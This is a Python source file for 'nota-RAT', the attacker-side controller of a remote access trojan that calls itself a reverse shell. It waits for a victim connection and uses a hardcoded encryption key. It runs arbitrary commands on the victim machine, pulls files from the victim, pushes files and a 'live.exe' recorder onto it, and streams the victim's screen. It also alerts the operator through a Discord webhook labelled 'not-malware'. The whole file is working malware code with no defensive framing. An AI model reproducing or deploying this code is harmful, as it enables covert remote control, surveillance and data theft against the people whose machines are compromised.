import socket, argparse, subprocess, re, time, os
from sys import platform
from vidstream import StreamingServer
from threading import Thread
from cryptography.fernet import Fernet
from discord_webhook import DiscordWebhook, DiscordEmbed


parser = argparse.ArgumentParser(
    description="nota-RAT, python reverse shell using sockets."
)

parser.add_argument(
    "-p", "--port", default=421, help="Port of the Server", type=int
)

parser.add_argument(
    "-d", "--discord", help="Discord webhook for new connections", type=str
)



hostname = socket.gethostname()
IPAddr = socket.gethostbyname(hostname)
args = parser.parse_args()
SERVER_HOST = "0.0.0.0"
SERVER_PORT = args.port
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"
receiver = StreamingServer(IPAddr, 423)
key = b'fXpsGp9mJFfNYCTtGeB2zpY9bzjPAoaC0Fkcc13COy4='


''' Colors '''
MAIN = '\033[38;5;50m'
PLOAD = '\033[38;5;119m'
GREEN = '\033[38;5;47m'
BLUE = '\033[0;38;5;12m'
ORANGE = '\033[0;38;5;214m'
RED = '\033[1;31m'
END = '\033[0m'
BOLD = '\033[1m'


''' MSG Prefixes '''
INFO = f'{MAIN}Info{END}'
EXIT = f'{MAIN}Exited{END}'
WARN = f'{ORANGE}Warning{END}'
IMPORTANT = WARN = f'{ORANGE}Important{END}'
FAILED = f'{RED}Fail{END}'
DEBUG = f'{ORANGE}Debug{END}'
INPUT = f'{BLUE}Input{END}'
REMOTE = WARN = f'{ORANGE}Remote{END}'
CLEAR = f'{PLOAD}CLEARED{END}'


print(f"""{PLOAD}
                       __                                           __     
                      /  |                                         /  |    
 _______    ______   _$$ |_     ______          ______   ______   _$$ |_   
/       \  /      \ / $$   |   /      \        /      \ /      \ / $$   |  
$$$$$$$  |/$$$$$$  |$$$$$$/    $$$$$$  |      /$$$$$$  |$$$$$$  |$$$$$$/   
$$ |  $$ |$$ |  $$ |  $$ | __  /    $$ |      $$ |  $$/ /    $$ |  $$ | __ 
$$ |  $$ |$$ \__$$ |  $$ |/  |/$$$$$$$ |      $$ |     /$$$$$$$ |  $$ |/  |
$$ |  $$ |$$    $$/   $$  $$/ $$    $$ |      $$ |     $$    $$ |  $$  $$/ 
$$/   $$/  $$$$$$/     $$$$/   $$$$$$$/       $$/       $$$$$$$/    $$$$/                                                  
                                           {END}nota RAT v1.0 | fluffydolphin                             
""")


s = socket.socket()

s.bind((SERVER_HOST, SERVER_PORT))
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.listen(5)
print(f"[{IMPORTANT}] {BOLD}Awaiting connection on {SERVER_HOST}:{SERVER_PORT} .....{END}")

client_socket, client_address = s.accept()
print(f"[{IMPORTANT}] {BOLD}{client_address[0]}:{client_address[1]} Connected! \n{END}")
time.sleep(1)
print(f'\r[{GREEN}Shell{END}] {BOLD}Stabilizing command prompt .....{END}', end = '\n\n') #yes I stole this from hoax get over it
time.sleep(1.8)


if args.discord:
    ping_command = f"ping {client_address[0]}"

    if platform == 'win32':
        pings_command = subprocess.run(["ping", f"{client_socket.getpeername()[0]}"], capture_output = True).stdout.decode()
        ping = re.search("Average = (.*)", pings_command)
    else: 
        pings_command = subprocess.run(["ping", f"{client_socket.getpeername()[0]}", "-c", "4"], capture_output = True).stdout.decode()
        ping = re.split("/", pings_command)
    ping = ping[-1].replace("\n", "")


    webhook = DiscordWebhook(url=args.discord, content='@everyone')
    embed = DiscordEmbed(title='not-malware', description='An encrypted reverse shell', color='03b2f8')
    embed.set_author(name='fluffydolphin', url='https://github.com/fluffydolphin')
    embed.add_embed_field(name='Connection', value=f'{client_address[0]}')
    embed.add_embed_field(name='Ping', value=f'{ping}')
    embed.set_timestamp()
    webhook.add_embed(embed)
    webhook.execute()


cwd = client_socket.recv(BUFFER_SIZE)
cwd = Fernet(key).decrypt(cwd).decode()
print(f"[{GREEN}Shell{END}] [+] Current working directory:", cwd)

while True:
    try:
        command = input(f"\n[{INPUT}] {cwd} $> ")
        if not command.strip():
            continue
        if command == "exit" or command == "quit" or command == "q":
            exit_choice = input(f"[{IMPORTANT}] Are you sure you want to exit (y/n)? {END}")
            while(exit_choice != "y" and exit_choice != "n"):
                print(f"[{FAILED}] (y/n) \n{END}")
                time.sleep(0.4)
                exit_choice = input(f"[{IMPORTANT}] Are you sure you want to exit (y/n)? {END} ")
            if exit_choice == "y":
                command = "/stoplive"
                command = Fernet(key).encrypt(command.encode())
                client_socket.send(command)
                receiver.stop_server()
                if args.discord:
                    webhook = DiscordWebhook(url=args.discord, content='@everyone')
                    embed = DiscordEmbed(title='nota-RAT', description='An encrypted reverse shell', color='03b2f8')
                    embed.set_author(name='fluffydolphin', url='https://github.com/fluffydolphin')
                    embed.add_embed_field(name='Disconnection', value=f'{client_address[0]}')
                    embed.set_timestamp()
                    webhook.add_embed(embed)
                    webhook.execute()
                commands = "exit"
                commands = Fernet(key).encrypt(commands.encode())
                client_socket.send(commands)
                msg = client_socket.recv(BUFFER_SIZE)
                msg = Fernet(key).decrypt(msg).decode()
                client_socket.close()
                s.close()
                print(f"\n[{EXIT}] {msg}\n")
                break
            if exit_choice == "n":
                continue
        if command == "/clear":
            def clear():
                os.system('cls' if os.name=='nt' else 'clear')
                return("   ")
            clear()
            print(f"[{CLEAR}] ")
            continue
        if command == "/help":
            print(
        f'''{MAIN}
        \r  Command                    Description
        \r  -------                    -----------
        \r  /help                       Print this message.
        \r  /getlive                    Gets a live feed of victim's screen.
        \r  /stoplive                   Stop the live feed of victim's screen.
        \r  /sendfile                  Sends a file from the files directory in the attacker directory.
        \r  /getfile                   Gets a file from the victim's CWD and puts it into the files directory.
        \r  /clear                      Clear screen.
        \r  exit/quit/q                  Close session and exit.
        {END}''')
            continue
        if command != "/clear" and command != "/help":
            commandz = Fernet(key).encrypt(command.encode())
            client_socket.send(commandz)
        if command == "/getfile":
            filenames = input(f"[{IMPORTANT}] Please enter the filename: ")
            filename = Fernet(key).encrypt(filenames.encode())
            client_socket.send(filename)
            remaining = int.from_bytes(client_socket.recv(4),'big')
            f = open(f"./files/{filenames}","wb")
            while remaining:
                data = client_socket.recv(min(remaining,4096))
                remaining -= len(data)
                f.write(data)
            f.close()
        if command == "/sendfile":
            filenames = input(f"[{IMPORTANT}] Please enter the filename: ")
            filename = Fernet(key).encrypt(filenames.encode())
            client_socket.send(filename)
            with open(f"./files/{filenames}", "rb") as f:
                data = f.read()
                dataLen = len(data)
                client_socket.send(dataLen.to_bytes(4,'big'))
                client_socket.send(data)
            f.close()
        if command == "/getlive":
            server_location = client_socket.recv(BUFFER_SIZE)
            server_location = Fernet(key).decrypt(server_location).decode()
            if server_location == "no":
                print(f"\n[{IMPORTANT}] Transfering live recorder ......")
                with open("live.exe", "rb") as f:
                    data = f.read()
                    dataLen = len(data)
                    client_socket.send(dataLen.to_bytes(4,'big'))
                    client_socket.send(data)
                f.close()
            if server_location == "yes":
                print(f"\n[{IMPORTANT}] Found live Streaming Server in RAT CWD")
            print(f"[{IMPORTANT}] Starting live Streaming Server ......")
            p = Thread(target=receiver.start_server)
            p.start()
            server_state = client_socket.recv(BUFFER_SIZE)
            server_state = Fernet(key).decrypt(server_state).decode()
            print(f"[{IMPORTANT}] {server_state}")
            continue
        if command == "/stoplive":
            receiver.stop_server()
            receiver = StreamingServer(IPAddr, 422)
            continue
        output = client_socket.recv(BUFFER_SIZE)
        output = Fernet(key).decrypt(output).decode()
        results, cwd = output.split(SEPARATOR)
        if command != "/getfile" and command != "/sendfile" and command != "/getlive" and command != "/stoplive":
            print(f"{GREEN}{results}{END}")
        else: continue
    except KeyboardInterrupt:
        exit_choice = input(f"\n[{IMPORTANT}] Are you sure you want to exit (y/n)? {END}")
        while(exit_choice != "y" and exit_choice != "n"):
            print(f"[{FAILED}] (y/n) \n{END}")
            time.sleep(0.4)
            exit_choice = input(f"\n[{IMPORTANT}] Are you sure you want to exit (y/n)? {END} ")
        if exit_choice == "y":
            command = "/stoplive"
            command = Fernet(key).encrypt(command.encode())
            client_socket.send(command)
            receiver.stop_server()
            commands = "exit"
            commands = Fernet(key).encrypt(commands.encode())
            client_socket.send(commands)
            msg = client_socket.recv(BUFFER_SIZE)
            msg = Fernet(key).decrypt(msg).decode()
            client_socket.send(commands)
            client_socket.close()
            s.close()
            print(f"\n[{EXIT}] {msg}\n")
            break
        if exit_choice == "n":
            continue
client_socket.close()
s.close()
